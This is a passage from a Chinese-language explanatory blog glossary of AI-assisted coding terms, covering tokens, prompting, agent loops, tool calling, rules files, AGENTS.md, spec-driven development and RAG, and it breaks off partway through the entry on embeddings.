<h4 data-id="heading-2">人工智能（AI）</h4>
<blockquote>
<p>说白了，就是让电脑学会像人一样动脑子——能理解问题、自己学东西、还能想办法解决。 在 Vibe Coding 里，AI 就相当于你随叫随到的编程搭子：你只要说清楚想干啥，它立马帮你把代码写好，跟有个程序员朋友全天候待命差不多。</p>
</blockquote>
<h4 data-id="heading-3">大语言模型（<code>LLM</code>）</h4>
<blockquote>
<p>大语言模型（<code>LLM</code>）就是一种特别能“说人话”的AI，像 <code>ChatGPT</code>、Claude 这些都是它的代表。 它之所以叫“大”，是因为背后有几十亿甚至上万亿个“小开关”（参数）在运作——读过的资料越多、学得越深，就越聪明，但同时也更费电脑资源。</p>
<p>你可以把它想象成一个通宵啃完全世界书和代码的超级学霸：你让它写代码、讲代码、改bug，它基本都能搞定，因为它啥都见过、啥都练过。</p>
</blockquote>
<h4 data-id="heading-4">模型参数</h4>
<blockquote>
<p>模型的“参数”其实就是它学到的知识，用一堆数字存着。参数越多，说明这模型“脑子”里装的东西越多，通常也就越聪明。</p>
<p>举个例子：</p>
<ul>
<li><code>GPT-4</code> 脑子最大，有大约1.8万亿个参数；</li>
<li><code>Claude 3.5 Sonnet</code> 没公布具体数字，但估计也有几千亿；</li>
<li><code>DeepSeek-V3</code> 有6710亿个参数。</li>
</ul>
<p>不过，参数多也意味着更“烧钱”——不仅训练贵，用起来也更费电、更占资源。所以一般来说：参数越多，能力越强，但花的钱和算力也越多。</p>
</blockquote>
<h4 data-id="heading-5">训练和推理</h4>
<blockquote>
<p>训练和推理，就是AI的“学习”和“考试”两个阶段。</p>
<p><strong>训练</strong>：相当于AI在“上学”，拼命看海量数据（比如书、代码、网页），把知识学到脑子里。这个过程特别费时间、费电脑，一般只有大公司才干得起，普通人不用操心。</p>
<p><strong>推理</strong>：就是AI“学成出山”后，你问它问题，它用学到的东西给你回答——比如你跟<code>ChatGPT</code>聊天、让它写代码，这时候它就是在“答题”。</p>
<p>简单说：训练是AI自己埋头苦读，推理是你用它现成的本事。我们平时用AI，其实都是在用它的“考试能力”。</p>
</blockquote>
<h4 data-id="heading-6">微调（Fine-tuning）</h4>
<blockquote>
<p>微调就像是给一个已经大学毕业的AI“再上个专业培训班”。</p>
<p>它本来啥都懂一点，但如果你拿一堆医学资料或者你公司的代码专门训练它一阵子，它就能在那个领域变得更专业、更对口。</p>
<p>不过，搞微调要花不少钱和精力，对普通人来说有点“杀鸡用牛刀”。大多数时候，直接用现成的AI就完全够用了，不用自己折腾。</p>
</blockquote>
<h3 data-id="heading-7">Token 和计费</h3>
<h4 data-id="heading-8">Token</h4>
<blockquote>
<p>Token 就是 AI 看文字时的“最小计数单位”，你可以把它当成“词块”或者“字块”。</p>
<ul>
<li>英文里，一个单词（比如 "hello"）大概算 1 个 token，有时候一个词还会被拆成几块。</li>
<li>中文更“费”一点，一个汉字通常算 1 到 2 个 token，所以中文比英文更容易“烧”token。</li>
</ul>
<p>为啥要关心这个？因为用 AI 是按 token 收费的——你输入的问题 + AI 回答的内容，全都要算进去。用得越多，花得越多。</p>
<p>举个例子：</p>
<ul>
<li>“Hello World” ≈ 2 个 token</li>
<li>“你好世界” ≈ 4 到 6 个 token</li>
</ul>
<p>所以，别小看多打几个字，可能就多花几分钱！</p>
</blockquote>
<h4 data-id="heading-9">输入 Token 和输出 Token</h4>
<blockquote>
<p>用 AI 时，收费是分开算的：</p>
<ul>
<li><strong>你发给 AI 的内容</strong>（比如问题、代码、文件）算“输入 token”；</li>
<li><strong>AI 回给你的答案</strong>（比如解释、生成的代码）算“输出 token”。</li>
</ul>
<p>而且通常 <strong>输出比输入更贵</strong>，因为让 AI “动脑子写东西”比“看懂你在说啥”更费劲、更耗资源。</p>
<p><strong>省钱妙招</strong>： 别啰嗦，提示词尽量写得清楚又简洁。这样 AI 一次就搞明白你要干啥，不用来回问好几轮——既省 token，又省时间！</p>
</blockquote>
<h4 data-id="heading-10">上下文窗口</h4>
<blockquote>
<p><strong>上下文窗口</strong>就是 AI 一次能“看”和“记住”多少内容，用 token 来算。你可以把它想象成 AI 的“临时记忆容量”。</p>
<p>不同模型这个容量差别很大：</p>
<ul>
<li>GPT-4o 能记大约 10 万字中文；</li>
<li>Claude 3.5 Sonnet 能记约 15 万字；</li>
<li>Gemini 2.0 Pro 更猛，能记下差不多 150 万字——相当于一本小书了！</li>
</ul>
<p><strong>好处是</strong>：代码文件特别大、对话历史特别长的时候，大窗口模型不会“忘前事”，处理起来更顺畅。</p>
<p><strong>但注意</strong>：窗口越大，每次用的 token 就越多，花的钱也越多。所以别盲目追求大，够用就行——就像吃饭，吃太撑反而浪费。</p>
</blockquote>
<h3 data-id="heading-11">提示词相关</h3>
<h4 data-id="heading-12">提示词（Prompt）</h4>
<blockquote>
<p><strong>提示词</strong>就是你跟 AI 说话的方式——你告诉它要干啥，越清楚，它干得越好。</p>
<p>别只说“做个网站”这种模糊话，那等于让别人“做顿饭”，却不说是中餐还是西餐。 好的提示词得<strong>具体、带背景、说清格式</strong>，比如：</p>
<blockquote>
<p>“用 React 做个蓝色主题的记账网站，要有添加支出、查看列表、统计总额这三个功能。”</p>
</blockquote>
<p>这样 AI 才能精准干活，不瞎猜。</p>
<p>另外，AI 对话其实有三种“角色”：</p>
<ul>
<li><strong>系统提示</strong>（你看不见）：悄悄告诉 AI “你是个程序员，要专业、简洁”；</li>
<li><strong>你发的消息</strong>（用户提示）：就是你的需求或问题；</li>
<li><strong>AI 回的</strong>（助手提示）：它的回答。</li>
</ul>
<p>知道这三块有啥用？比如调试时，你可以假装前面已经聊过几轮，把上下文“喂”给 AI，它就能更懂你在说啥，不用从头解释。</p>
<p>总之：<strong>会说话，AI 才会办事</strong>。</p>
</blockquote>
<h4 data-id="heading-13">系统提示词</h4>
<blockquote>
<p><strong>系统提示词</strong>就像是你在 AI 开工前，悄悄给它立的“人设”和“规矩”。</p>
<p>比如你告诉它：</p>
<blockquote>
<p>“你是个资深 React 开发，说话要专业，代码要简洁清晰。”</p>
</blockquote>
<p>那接下来整个对话里，它都会按这个角色来回答——不会突然跑偏去讲 Python，也不会写一堆啰嗦的注释。</p>
<p>这个设置是<strong>全程生效</strong>的，而且对用户自己不可见（但能影响 AI 的表现）。 所以，如果你希望 AI 更像某个领域的专家、语气更正式或更随意，都可以通过系统提示词提前“调教”好。</p>
<p>简单说：<strong>系统提示词 = 给 AI 定角色、定风格、定规矩的幕后指令</strong>。</p>
</blockquote>
<h4 data-id="heading-14">提示词工程</h4>
<blockquote>
<p><strong>提示词工程</strong>说白了，就是“怎么跟 AI 把话说到位”的技巧。</p>
<p>你不是随便问一句，而是<strong>有策略地组织语言</strong>，让 AI 一眼就明白你要啥、怎么干、干成什么样。 在 Vibe Coding 里，这本事特别值钱——会写提示词的人，往往一两句话就能让 AI 输出高质量代码；不会的，可能来回折腾好几轮还跑偏。</p>
<p>所以，<strong>提示词工程 = 用最聪明的方式指挥 AI，少废话、快出活、结果准</strong>。 它不是玄学，而是一门“让 AI 听懂人话”的实用技能。</p>
</blockquote>
<h4 data-id="heading-15">零样本提示（Zero-shot）</h4>
<blockquote>
<p><strong>零样本提示</strong>就是你直接给 AI 下命令，不给例子、不带示范，全靠它自己“凭经验”干活。</p>
<p>比如你直接说：“把这段英文翻译成中文。” AI 就会调用它以前学过的东西，试着完成任务。</p>
<p>这种方式适合<strong>简单、常见的任务</strong>，比如翻译、解释概念、写个基础函数——因为这些它见得太多了，不用教也会。</p>
<p>但要是任务比较冷门或复杂，光靠零样本可能不够准，这时候就得给点例子（也就是“少样本提示”）帮它理解。</p>
<p>简单说：<strong>零样本 = 一句话直接吩咐，AI 靠老本儿干活</strong>。能行就行，不行就得多教两招。</p>
</blockquote>
<h4 data-id="heading-16">少样本提示（Few-shot）</h4>
<blockquote>
<p><strong>少样本提示</strong>就是“先给 AI 打个样”，让它照着你的格式或风格来干活。</p>
<p>比如你想让 AI 翻译，但又怕它乱翻，就先写两三个例子：</p>
<blockquote>
<p>英文：Hello → 中文：你好 英文：Thank you → 中文：谢谢</p>
</blockquote>
<p>然后你再给新句子，它就会<strong>模仿你给的格式</strong>，乖乖输出“中文：早上好”这种一致的结果。</p>
<p>这种方式特别适合：</p>
<ul>
<li>你有特定格式要求（比如日志、表格、代码注释）</li>
<li>或者任务有点模糊，光说不清，得看例子才明白</li>
</ul>
<p>简单说：<strong>少样本提示 = 先示范，再干活，AI 学得快、做得准</strong>。比干巴巴下命令靠谱多了。</p>
</blockquote>
<h4 data-id="heading-17">思维链提示（Chain-of-Thought）</h4>
<blockquote>
<p><strong>思维链提示</strong>就是让 AI 别急着“脱口而出”，而是像人一样<strong>一步一步想清楚再答</strong>。</p>
<p>你只要在问题里加一句：“请一步一步思考”或者“Let’s think step by step”，AI 就会先把问题拆解、分析逻辑、理清步骤，最后再给答案。</p>
<p>这招对<strong>复杂问题特别管用</strong>——比如写一个带多个功能的程序、排查奇怪的 bug，或者处理有陷阱的逻辑题。 因为 AI 一旦跳过思考直接写代码，很容易漏掉细节；但让它“出声思考”（哪怕只是文字），往往能写出更合理、更靠谱的代码。</p>
<p>简单说：<strong>加一句“慢慢想”，AI 就从“抢答选手”变成“认真解题的学霸”</strong> 。结果更准，结构也更清晰。</p>
</blockquote>
<h4 data-id="heading-18">Markdown 语言</h4>
<blockquote>
<p><strong>Markdown 就是用简单符号快速排版文字的方法</strong>，比如：</p>
<ul>
<li>用 <code>#</code> 写标题</li>
<li>用 <code>**加粗**</code> 让字变粗</li>
<li>用 <code>-</code> 列清单</li>
</ul>
<p>在 Vibe Coding 里，它特别常用，因为：</p>
<ul>
<li>AI 回答你时，默认就用 Markdown 格式（带标题、代码块、列表等）</li>
<li>项目说明文件（比如 <code>README</code>）基本都是用 Markdown 写的</li>
<li>一些规则或配置文档也是 Markdown</li>
</ul>
<p>所以，<strong>会点 Markdown，你就能看得懂 AI 的输出，也能写出整洁专业的文档</strong>——不用点鼠标调格式，敲几个符号就行，又快又清爽。</p>
</blockquote>
<h3 data-id="heading-19">AI 编程模式</h3>
<h4 data-id="heading-20">Vibe Coding</h4>
<blockquote>
<p>Vibe Coding 是计算机大牛 <code>Andrej Karpathy</code> 在 2025 年初提出来的一个新玩法：你不用自己敲代码，只要用大白话告诉 AI 你想要什么功能、希望程序怎么运行，AI 就能帮你写出能跑的代码。</p>
<p>说白了，编程的重点不再是记语法、写细节，而是你能把自己的想法说清楚。就像点外卖——你不用会做菜，但得知道自己想吃啥，剩下的交给厨房（也就是 AI）搞定</p>
</blockquote>
<h4 data-id="heading-21"><code>Agentic Coding</code> 智能体编程</h4>
<blockquote>
<p><code>Agentic Coding</code> 就是让 AI 像个能自己动脑干活的“小助手”，不光听你问才答，还能主动规划、动手、检查、修错。</p>
<p>比如在 Cursor 的 Agent 模式里，它能自己看代码、想方案、改文件、跑测试，发现问题还能自动修好——整个过程不用你一步步指挥。 说白了，它不是“问答机”，而是“办事员”，能独立搞定一整套复杂任务。</p>
</blockquote>
<h4 data-id="heading-22">多智能体协作</h4>
<blockquote>
<p>多智能体协作，说白了就是让几个 AI 各干各的活儿，像组了个小团队一起搞项目。</p>
<p>比如你想做个网站：一个 AI 负责搭整体结构，一个写页面（前端），一个搞后台逻辑（后端），还有一个专门挑毛病、查代码漏洞。它们互相配合，不用你挨个指挥。</p>
<p>这两年这玩法越来越火，因为单个 AI 再聪明也容易顾此失彼，而“团队作战”才能扛得住真正复杂的活儿——就像没人指望一个人又当设计师又当程序员还当测试员，对吧？</p>
</blockquote>
<h4 data-id="heading-23">智能体编排</h4>
<blockquote>
<p>编排其实就是当“AI 团队的包工头”。</p>
<p>你有一堆 AI 智能体，各自会干点活，但谁先干、谁后干、怎么传数据、结果怎么拼起来——这些都得有人安排。编排器就是干这个的：不亲自写代码，但把整个流程理顺，让每个 AI 在对的时间干对的事。</p>
<p>就像乐队指挥，自己不吹号不拉琴，但一抬手，小提琴进，鼓点跟上，铜管收尾——整首曲子才不乱套。没它，一群 AI 各自为战，反而容易搞砸。</p>
</blockquote>
<h4 data-id="heading-24">Agent Loop 智能体循环</h4>
<blockquote>
<p>Agent Loop 说白了，就是 AI 干活的“思考-动手-检查”循环。</p>
<p>它不是一次性给你答案就完事，而是像人一样反复折腾： 先看看现在啥情况（比如读代码、看报错）， 然后想“接下来该干啥”， 接着动手改、跑命令、写点东西， 再回头瞅一眼“改对了没？跑通了吗？”， 要是不行，就再来一轮——直到搞定为止。</p>
<p>用 Cursor Agent 的时候，你其实是在放一个会自己试错、调整、死磕到底的 AI 程序员在干活。理解这点，你就知道为啥它有时候要来回跑好几次——不是卡了，是在认真闭环。</p>
</blockquote>
<h4 data-id="heading-25"><code>ReAct</code> 推理与行动</h4>
<blockquote>
<p><code>ReAct</code>（Reasoning and Acting）</p>
<p><code>ReAct</code> 其实就是让 AI 学会“边想边干，干了再想”。</p>
<p>以前的 AI 要么光说不练（只输出答案），要么瞎干一通（直接执行不思考）。<code>ReAct</code> 改变了这个毛病：它让 AI 先动脑子——“现在啥情况？该怎么做？”；然后动手试一试；做完马上看结果对不对；如果不对，立刻调整思路再来。</p>
<p>这就像你修电脑：先判断是不是网线松了（推理），去插紧（行动），看能不能上网（观察），不行就换思路查路由器（再推理）…… AI 用 <code>ReAct</code> 就是这么一步步靠谱地把复杂任务搞定的。现在的智能编程工具，背后基本都靠这套逻辑撑着。</p>
</blockquote>
<h4 data-id="heading-26">工具调用</h4>
<blockquote>
<p>工具调用，其实就是让 AI 从“嘴炮”变成“能动手”的关键一步。</p>
<p>AI 本身只会生成文字，干不了实际的事。但通过工具调用，它能在需要时“喊人帮忙”——比如读文件、跑命令、查网页、连数据库等等。</p>
<p>整个过程分四步，特别像你指挥一个实习生：</p>
<ol>
<li><strong>看出问题</strong>：AI 想，“光靠我说不行，得查点东西”；</li>
<li><strong>选对工具</strong>：决定是读文件、还是调 <code>API</code>；</li>
<li><strong>下指令</strong>：不是自己干，而是说清楚“请用 XX 工具，参数是 A、B、C”；</li>
<li><strong>收结果再处理</strong>：等系统真把结果拿回来，它再结合这个信息继续干活或回答你。</li>
</ol>
<p>重点来了：AI 并不直接操作电脑，它只是“开单子”，真正执行的是背后的程序。</p>
<p>在 Vibe Coding 里，这套机制就是 AI 的“手和脚”。比如 Cursor 的 Agent 模式，之所以能自动改代码、跑测试，全靠它不断调用外部工具——没这能力，AI 再聪明也只能纸上谈兵。</p>
</blockquote>
<h4 data-id="heading-27">Agent Skills 智能体技能</h4>
<blockquote>
<p><code>Agent Skills</code> 就像是给 AI 装“专业插件包”，让它临时变成某个领域的老手。</p>
<p>Anthropic 在 2025 年底搞了个标准：你只要建个文件夹，放个 <code>SKILL.md</code> 说明文档，再配上脚本、规则或参考资料，AI 遇到相关任务时就会自动“加载这个技能”。</p>
<p>比如：</p>
<ul>
<li>你有个 <strong><code>PDF</code> 表单填写</strong> 的 Skill，AI 原本不会处理 <code>PDF</code>，但一加载它，立马知道怎么填；</li>
<li>你团队有套特殊的 <strong>上线部署流程</strong>？写成一个 Skill，AI 就能照着你的规矩来，不用你每次手把手教；</li>
<li>想让 AI 按你们项目的风格 <strong>审查代码</strong>？丢个代码规范 Skill 给它，它就按你的标准挑毛病。</li>
</ul>
<p>最关键的是，AI 不会一股脑把所有技能都塞进脑子——只在真正用得上的时候才调出来。这样既省资源，又不卡顿，就像人一样：平时不用记怎么做心肺复苏，等真遇到急救场景，才翻手册或调用训练记忆。</p>
<p>说白了，Skills 让 AI 从“通才”变成“随叫随到的专家”。</p>
<p>Skills 的核心设计是 <strong>渐进式披露</strong>：AI 只在需要时才加载相关内容，不会一次性把所有信息都塞进上下文，既节省 Token 又保持灵活性</p>
</blockquote>
<h4 data-id="heading-28"><code>A2A</code>（Agent-to-Agent）</h4>
<blockquote>
<p><code>A2A</code>（Agent-to-Agent）说白了，就是给 AI 们定一套“团队聊天规则”。</p>
<p>单个 AI 再厉害，干大活也容易抓瞎。但如果几个 AI 能像同事一样互相说话、分任务、同步进度，事情就好办多了。 <code>A2A</code> 就是让它们能<strong>互相理解、协调行动</strong>的底层约定——比如一个 AI 说“前端我搞定了，后端你接着来”，另一个就能听懂并接上。</p>
<p>没有这套协议，每个 AI 都是孤岛；有了它，它们才能真组成一个配合默契的“AI 小组”，一起搞定复杂项目。 就像打篮球，光个人技术好不够，得会传球、喊话、看队友位置——<code>A2A</code> 就是 AI 团队的“场上沟通”。</p>
</blockquote>
<h4 data-id="heading-29"><code>BMAD</code> 敏捷 AI 开发方法</h4>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbmad-code-org%2FBMAD-METHOD" target="_blank" title="https://github.com/bmad-code-org/BMAD-METHOD" ref="nofollow noopener noreferrer">BMAD-METHOD</a>（Breakthrough Method of Agile AI-Driven Development，突破性敏捷 AI 驱动开发方法）是一套系统化的 AI 智能体开发框架，旨在将原本混乱的 AI 编程过程变得结构化、可复用。</p>
<p><code>BMAD</code> 方法，说白了就是给 AI 编程“立规矩、分角色”，把原来靠感觉瞎跑的 AI 开发，变成一套像正规军打仗一样的流程。</p>
<p>它把整个开发过程拆成几个明确角色，每个 AI 负责一块：</p>
<ul>
<li><strong>分析师 AI</strong>：搞清楚用户是谁、市场要啥，输出项目简报；</li>
<li><strong>产品经理 AI</strong>：把简报变成具体功能清单（<code>PRD</code>）；</li>
<li><strong>架构师 AI</strong>：设计技术方案，决定用什么框架、怎么搭系统。</li>
</ul>
<p>而且 AI 还分两种：</p>
<ul>
<li><strong>简单 AI</strong>：干点小事，比如写个文档、查个代码，一个文件搞定；</li>
<li><strong>专家 AI</strong>：能记住上次干到哪，有自己的“工作台”（专属文件夹），适合长期复杂任务，比如从零搭一个 <code>App</code>。</li>
</ul>
<p>每个 AI 都有清晰的“人设”——你是谁、说话啥风格、能干啥、怎么配合别人，全都标准化了。不是随便乱聊，而是各司其职、按流程推进。</p>
<p>这套方法在 <code>GitHub</code> 上火到几万星，说明大家终于意识到：光靠一个 AI 盲打蛮干不行，得像管理真人团队一样，让 AI 有分工、有纪律、有记忆——这才真正把 AI 变成了靠谱的开发伙伴。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df8993e0806c4344a8971d24d34f0717~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeR6YeR6YeRX18=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704918&amp;x-signature=66UUGLpu5VeFRc9GNbGxvlfOXBs%3D" alt="image-20260203134822554.png" loading="lazy"/></p>
</blockquote>
<h4 data-id="heading-30">Browser Use 浏览器使用</h4>
<blockquote>
<p>Browser Use 说白了，就是让 AI 能像真人一样“自己开浏览器干活”。</p>
<p>它不靠网站提供 <code>API</code>，而是直接操作网页：点按钮、填表单、翻页面、抓数据——就跟你在电脑前手动操作一模一样。</p>
<p>典型用法比如：</p>
<ul>
<li>让 AI 自己去网上搜资料、比价格、整理信息；</li>
<li>把网页上的表格或新闻自动扒下来变成结构化数据；</li>
<li>帮你填那种又长又烦的在线申请表；</li>
<li>甚至跨多个网站串着操作，比如先查航班、再订酒店、最后发邮件确认。</li>
</ul>
<p>关键优势是：<strong>AI 能直接用你已经登录的浏览器</strong>。你不用给每个网站写接口，也不用担心没开放 <code>API</code>——只要你能打开的网页，AI 基本都能操作。</p>
<p>现在像 Cursor、Claude Code 这些工具都内置了这能力，写代码时能自动开浏览器预览、跑测试；开源项目比如 Browser-Use 也让你用 Python 调大模型来控制浏览器。</p>
<p>一句话总结：Browser Use 让 AI 真正“上网”，而不只是“联网说话”。</p>
</blockquote>
<h4 data-id="heading-31">Computer Use 计算机使用</h4>
<blockquote>
<p>Computer Use 就是让 AI 从“会说话”升级成“会动手操作你整个电脑”。</p>
<p>和只能在浏览器里点点点的 Browser Use 不同，Computer Use 能干的事更广： 它能看屏幕、移动鼠标、敲键盘、开软件、跑命令行——就像有个看不见的数字员工坐在你电脑前干活。</p>
<p>它是这么工作的：</p>
<ol>
<li><strong>看一眼屏幕</strong>（截屏分析当前界面）</li>
<li><strong>想下一步干啥</strong>（比如“点这个保存按钮”）</li>
<li><strong>动手操作</strong>（模拟鼠标点击或键盘输入）</li>
<li><strong>看结果对不对</strong>，不对就再调整</li>
</ol>
<p>当然，为了安全，这功能一般跑在虚拟机里，不会真动你本机文件——除非你明确授权。</p>
<p>Anthropic 在 2026 年基于这个技术推出了 <strong><code>Claude Cowork</code></strong>，一个能直接帮你整理下载文件夹、从截图里抠数据填表格、甚至做品牌周报的桌面助手。 它不再只是聊天框里的“嘴替”，而是真正能进你工作流、碰你文件、用你软件的“同事”。</p>
<p>说到底，Computer Use 标志着 AI 从“回答问题”迈进了“替你做事”的时代——不是写代码给你，而是直接在你电脑上把事办了。</p>
</blockquote>
<h3 data-id="heading-32">上下文管理</h3>
<h4 data-id="heading-33">上下文（Context）</h4>
<blockquote>
<p>上下文，就是 AI 回答问题时能“看到”的所有背景信息。</p>
<p>比如：你们之前聊了啥、你当前打开了哪些代码文件、项目整体长什么样、配置是怎么设的，还有你额外给的文档或说明——这些都算。</p>
<p>你给的上下文越准、越全，AI 写出来的东西就越贴合你的实际需求。 这就像带新同事接手项目：你要是只说“你改一下登录功能”，他可能瞎改；但如果你顺手把相关文件、设计稿、历史问题都指给他看，他立马就能上手干对事。</p>
<p>所以，别光提需求，多让 AI “看见”你的项目现场——它才能真帮上忙。</p>
</blockquote>
<h4 data-id="heading-34">上下文工程</h4>
<blockquote>
<p>上下文工程，说白了就是“给 AI 喂刚好够用的信息”，不多不少，刚刚好。</p>
<p>太多信息？AI 容易懵、跑偏，还费钱； 太少信息？它根本不知道你在干啥，瞎猜一通。</p>
<p>所以高手会这样干：</p>
<ul>
<li>只塞<strong>最相关的代码文件</strong>，别把整个项目一股脑扔进去；</li>
<li>附上几句<strong>关键背景</strong>，比如“这是个电商后台，用户要能一键退款”；</li>
<li>用规则文件（比如 <code>.ai-rules.md</code>）告诉 AI 你们项目的命名规范、技术栈、禁忌；</li>
<li>还会定期<strong>清理旧对话</strong>，别让上周聊的登录功能干扰今天改的支付逻辑。</li>
</ul>
<p>本质上，上下文工程不是堆信息，而是<strong>精准投喂</strong>——像给同事递工具，你要的是扳手，我就递扳手，不连锤子锯子螺丝刀全砸你桌上。</p>
<p>这样 AI 才能又快又准地干活。</p>
</blockquote>
<h4 data-id="heading-35">规则文件</h4>
<blockquote>
<p>规则文件（Rules File）是放在项目中的配置文件，用来告诉 AI 你的项目规范、技术栈、代码风格等信息。有了规则文件，AI 每次生成代码时都可以参考这些规则，生成的代码更符合你的项目风格，省去了反复强调的麻烦。</p>
<p>不同 AI 编程工具使用不同的规则文件格式：</p>
<ul>
<li><code>Cursor</code>：早期使用 <code>.cursorrules</code> 单文件格式，现在推荐使用 <code>.cursor/rules/*.mdc</code> 多文件格式</li>
<li><code>Claude Code</code>：使用 <code>CLAUDE.md</code> 文件</li>
<li><code>GitHub Copilot</code>：使用 <code>.github/copilot-instructions.md</code> 文件</li>
</ul>
<p>以 <code>Cursor</code> 为例，现代的 <code>.mdc</code> 规则文件支持 <code>YAML</code> 元数据，可以指定规则的适用范围：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">React</span> <span class="hljs-string">组件开发规范</span>
<span class="hljs-attr">globs:</span> <span class="hljs-string">src/components/**/*.tsx</span>
<span class="hljs-attr">alwaysApply:</span> <span class="hljs-literal">false</span>
<span class="hljs-meta">---</span>
<span class="hljs-comment"># React 规范</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">使用函数式组件</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">优先使用</span> <span class="hljs-string">hooks</span>
</code></pre>
<p>规则文件的激活方式有多种，比如：</p>
<ul>
<li>始终生效：设置 <code>alwaysApply: true</code></li>
<li>模式匹配：当引用匹配 <code>globs</code> 的文件时自动激活</li>
<li>手动调用：在对话中用 <code>@规则名</code> 引用</li>
<li>AI 自主决定：AI 根据任务相关性自动加载</li>
</ul>
<p>💡 注意，随着工具版本的更新，这些文件的名称和标准可能会发生改变，一切以工具官方文档为主。</p>
</blockquote>
<h4 data-id="heading-36"><code>AGENTS.md</code></h4>
<blockquote>
<p><code>AGENTS.md</code> 说白了，就是专给 AI 看的“项目操作手册”。</p>
<p>你平时写的 <code>README.md</code> 是给人看的——讲项目是干啥的、怎么安装； 而 <code>AGENTS.md</code> 是给 AI 编程助手用的——告诉它：<strong>在这个项目里，具体该怎么干活</strong>。</p>
<p>比如：</p>
<ul>
<li>跑起来要输什么命令（<code>npm run dev</code>）</li>
<li>测试怎么执行（<code>npm test</code>）</li>
<li>代码命名规矩（组件用 <code>PascalCase</code>，工具函数用 <code>camelCase</code>）</li>
<li>用的是 <code>TypeScript</code> 严格模式……</li>
</ul>
<p>AI 工具（像 Cursor、Claude Code、Copilot 等）一打开你的项目，只要看到根目录有 <code>AGENTS.md</code>，就会自动读取里面的内容，不用你再重复叮嘱“记得用 TS”“别乱改启动方式”。</p>
<p>这文件现在成了一个开放标准，几万个开源项目都在用。 相当于你给所有 AI 助手发了一张“上岗须知”——它们一进门就知道规矩，直接上手干对事，不添乱。</p>
<p>一句话：<code>README.md</code> 告诉人“这是什么”，<code>AGENTS.md</code> 告诉 AI“该怎么干”。</p>
<p>一个典型的 <code>AGENTS.md</code> 文件大概长这样：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 项目设置</span>
<span class="hljs-bullet">-</span> 安装依赖：npm install
<span class="hljs-bullet">-</span> 启动开发：npm run dev
<span class="hljs-bullet">-</span> 运行测试：npm test
​
<span class="hljs-section"># 代码规范</span>
<span class="hljs-bullet">-</span> 使用 TypeScript 严格模式
<span class="hljs-bullet">-</span> 组件文件使用 PascalCase 命名
<span class="hljs-bullet">-</span> 工具函数使用 camelCase 命名
</code></pre>
</blockquote>
<h4 data-id="heading-37"><code>SDD</code> 规范驱动开发</h4>
<blockquote>
<p><code>SDD</code>（规范驱动开发）说白了，就是<strong>先写清楚“到底要干啥”，再让 AI 动手写代码</strong>——把需求变成“法律”，AI 必须照章办事。</p>
<p>以前我们常是：边想边写、写完再补文档，结果代码和需求对不上，改来改去全是坑。 <code>SDD</code> 反过来：<strong>规范文档是唯一真相源</strong>，代码只是它的“执行结果”。</p>
<p>你可以把它理解成给项目立一部“宪法”：</p>
<ul>
<li>功能要实现什么？</li>
<li>接口长什么样？</li>
<li>出错怎么处理？</li>
<li>用什么技术栈？ 全写明白，AI 才能精准输出，而不是靠你一句模糊的“做个登录页面”瞎猜。</li>
</ul>
<p>为啥现在越来越多人用 <code>SDD</code>？ 因为大家发现：<strong>AI 写得好不好，不靠 prompt 玩花活，而靠需求清不清楚</strong>。一份好规范，胜过一百条“请认真一点”的提示。</p>
<p>典型流程也很清晰：</p>
<ol>
<li><strong>定原则</strong>：比如“必须响应式”“错误率低于0.1%”</li>
<li><strong>写需求</strong>：用户是谁？要解决什么问题？</li>
<li><strong>问清楚</strong>：让 AI 自己提问题，比如“手机号格式校验要多严？”</li>
<li><strong>做设计</strong>：定架构、<code>API</code>、数据模型</li>
<li><strong>拆任务</strong>：把大活切成小块，标好先后顺序</li>
<li><strong>生成代码</strong>：AI 按任务一项项实现，你只负责验收</li>
</ol>
<p>2025 年 <code>GitHub</code> 还出了个 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgithub%2Fspec-kit" target="_blank" title="https://github.com/github/spec-kit" ref="nofollow noopener noreferrer">Spec Kit</a> 工具包，用 <code>/spec</code>、<code>/plan</code> 这类命令一步步带你走完这套流程，主流 AI 编程工具都支持。</p>
<p>总结一句话：<code>SDD</code> 不是让人类少写代码，而是让 AI 少犯错——<strong>先想透，再动手，才是 AI 时代的高效开发</strong>。</p>
</blockquote>
<h4 data-id="heading-38">RAG 检索增强生成</h4>
<blockquote>
<p>RAG 说白了，就是给 AI 装个“随身资料库”，让它能边查边答，而不是光靠死记硬背。</p>
<p>普通 AI 回答问题全靠训练时学过的东西——就像考试只准用脑子，不能翻书。 但用了 RAG，AI 就像进了考场还能带你的项目文档、代码库、内部 <code>Wiki</code> 当“开卷参考资料”： 它先快速搜一遍你提供的材料，找到相关片段，再结合这些内容生成答案。</p>
<p>在 Vibe Coding 里这招特别管用——比如你要加个新功能，AI 不是凭空瞎写，而是先翻你现有的代码，看你怎么命名、怎么组织逻辑、用什么工具库，然后照着你的风格写出来，<strong>新代码和老代码像一个团队写的</strong>。</p>
<p>一句话：RAG 让 AI 从“凭记忆答题”变成“查你家底干活”，更准、更贴合、更少返工。</p>
</blockquote>
<h4 data-id="heading-39">向量数据库</h4>
<blockquote>
<p>向量数据库，说白了就是个“懂意思”的搜索库。</p>
<p>普通搜索靠关键词匹配——你搜“登录”，就只能找到带“登录”俩字的内容； 但向量数据库先把你的代码、文档转成一串数字（叫“向量”），这串数能代表它的<strong>意思</strong>。</p>
<p>所以当你搜“用户登录”，哪怕某个函数叫 <code>handleAuth</code> 或 <code>verifySession</code>，只要它干的是登录的事，系统也能认出来并找给你——因为它们的“语义”很接近。</p>
<p>在 AI 编程里，这就意味着： AI 能快速翻出项目里<strong>真正相关</strong>的代码片段，哪怕命名风格五花八门、注释写得少，它也能“心领神会”。</p>
<p>相当于给你的项目装了个“语义雷达”——不看字面，看意图。</p>
</blockquote>
<h4 data-id="heading-40">嵌入 Embedding</h4>
<blockquote>
<p>嵌入（Embedding）说白了，就是把文字或代码“翻译”成一串数字，这串数字能代表它的<strong>意思</strong>。</p>
